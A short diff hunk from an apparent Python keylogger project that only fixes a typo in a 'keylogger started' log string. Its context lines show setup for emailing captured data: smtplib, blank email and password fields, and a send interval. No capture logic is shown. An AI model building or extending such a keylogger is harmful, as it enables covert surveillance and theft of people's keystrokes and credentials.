@@ -4,7 +4,7 @@ import smtplib
 import tempfile
 import os
 
-log ='keylogger staeted'
+log ='keylogger started'
 email=''  # put your email ID
 password='' # put your password 
 interval = int(input("enter the time interval"))
